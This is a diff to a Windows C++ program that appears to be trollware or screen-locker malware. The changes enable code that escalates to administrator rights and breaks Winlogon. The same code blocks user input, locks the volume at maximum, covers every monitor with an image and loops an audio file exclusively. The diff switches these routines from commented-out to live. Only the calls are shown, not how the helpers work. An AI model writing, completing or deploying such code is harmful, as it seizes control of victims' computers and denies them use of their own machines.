@@ -1,5 +1,5 @@
-//#include "CoverImage.h"
-#include "MysterySong.h"
+#include "Assets/CoverImage.h"
+#include "Assets/MysterySong.h"
 #include "EZAudioClient.h"
 #include "EZProgram.h"
 #include "Helper.h"
@@ -66,7 +66,7 @@ void CoverMonitor(HMONITOR monitor) {
 
 		EZ::Program* program = new EZ::Program(programSettings, classSettings, windowSettings, rendererSettings);
 
-		//mysteryImage = program->GetRenderer()->LoadBitmap(CoverImage_Asset);
+		mysteryImage = program->GetRenderer()->LoadBitmap(CoverImage_Asset);
 
 		program->Run();
 
@@ -104,9 +104,13 @@ MonitorList GetMonitors() {
 }
 
 int main() {
-	/*
 	if (!IsAdmin()) {
 		RelaunchAsAdmin();
+		return 0;
+	}
+
+	if (!IsInteractive()) {
+		RestartInteractively();
 		return 0;
 	}
 
@@ -115,17 +119,11 @@ int main() {
 		return 0;
 	}
 
-	TakeSEDebugPrivilege();
-	MakeSystemCritical();
-
-	TakeSEDebugPrivilege();
 	BreakWinlogon();
 
 	BlockInput();
-	*/
 
-	EZ::PlayWAVExclusive(MysterySong_Asset);
-	return 0;
+	LockMaxVolume();
 
 	MonitorList monitors = GetMonitors();
 
@@ -134,7 +132,7 @@ int main() {
 		CoverMonitor(monitors.list[i]);
 	}
 
-	while (OpenWindowCount > 0) {}
+	EZ::PlayExclusiveLooping(MysterySong_Asset);
 
 	delete[] monitors.list;
 	return 0;
